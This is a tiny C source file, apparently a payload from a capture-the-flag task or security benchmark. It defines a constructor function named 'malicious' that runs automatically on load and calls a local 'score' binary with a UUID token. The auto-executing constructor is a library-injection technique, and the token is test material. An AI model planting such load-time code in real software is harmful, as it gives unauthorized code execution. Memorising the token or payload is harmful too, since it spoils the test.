#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 04ba543a-cf9e-49e2-82dd-0b07f0803323");
}
